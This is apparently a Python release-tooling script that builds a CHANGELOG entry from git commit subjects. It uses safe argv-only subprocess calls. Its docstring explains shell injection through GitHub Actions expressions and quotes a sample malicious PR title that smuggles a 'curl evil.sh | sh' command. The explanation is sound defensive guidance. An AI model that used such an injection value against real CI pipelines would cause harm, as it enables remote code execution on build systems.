"""Generate a CHANGELOG.md entry for a release from `git log` directly.

Security note (this is the whole reason this is a script and not an
inline `run:` step): commit subjects and PR titles are attacker-
controllable free text. Never let text like that flow through a GitHub
Actions `${{ }}` expression into a `run:` shell block - a malicious PR
title such as `"; curl evil.sh | sh #` becomes a shell-injection
primitive the moment it's interpolated that way. Reading it here via
`subprocess` (argv-only, never `shell=True`) and only ever WRITING it to
a file - never passing it back through another `${{ }}`/shell
interpolation - avoids that class of bug entirely.
"""

from __future__ import annotations

import argparse
import subprocess
import sys
from pathlib import Path
from typing import Optional

_CHANGELOG_HEADER = "# Changelog\n"


def commit_subjects_since(ref: Optional[str], git_dir: Path = Path(".")) -> list:
    range_arg = f"{ref}..HEAD" if ref else "HEAD"
    result = subprocess.run(
        ["git", "log", range_arg, "--pretty=format:%s\t%h", "--no-merges"],
        cwd=git_dir, capture_output=True, text=True, check=True,
    )
    subjects = []
    for line in result.stdout.splitlines():
        if not line:
            continue
        subject, _, short_hash = line.rpartition("\t")
        subjects.append((subject, short_hash))
    return subjects


def render_entry(version: str, date: str, subjects: list) -> str:
    lines = [f"## v{version} - {date}", ""]
    if subjects:
        for subject, short_hash in subjects:
            lines.append(f"- {subject} ({short_hash})")
    else:
        lines.append("- No changes recorded.")
    lines.append("")
    return "\n".join(lines) + "\n"


def prepend_to_changelog(changelog_path: Path, entry: str) -> None:
    if changelog_path.exists():
        existing = changelog_path.read_text(encoding="utf-8")
        previous_entries = existing[len(_CHANGELOG_HEADER):] if existing.startswith(_CHANGELOG_HEADER) else existing
        previous_entries = previous_entries.strip("\n")
    else:
        previous_entries = ""

    sections = [_CHANGELOG_HEADER.rstrip("\n"), entry.rstrip("\n")]
    if previous_entries:
        sections.append(previous_entries)
    changelog_path.write_text("\n\n".join(sections) + "\n", encoding="utf-8")


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--version", required=True, help="the version being released, e.g. 1.2.3 (no leading v)")
    parser.add_argument("--date", required=True, help="release date, YYYY-MM-DD")
    parser.add_argument("--since", default=None, help="previous tag (e.g. v1.2.2); omit for full history")
    parser.add_argument("--changelog", default="CHANGELOG.md", type=Path)
    parser.add_argument("--notes-out", default=None, type=Path, help="also write just this release's entry to a standalone file (for use as GH release notes)")
    args = parser.parse_args(argv)

    subjects = commit_subjects_since(args.since)
    entry = render_entry(args.version, args.date, subjects)
    prepend_to_changelog(args.changelog, entry)
    if args.notes_out is not None:
        args.notes_out.write_text(entry, encoding="utf-8")
    return 0


if __name__ == "__main__":
    sys.exit(main())
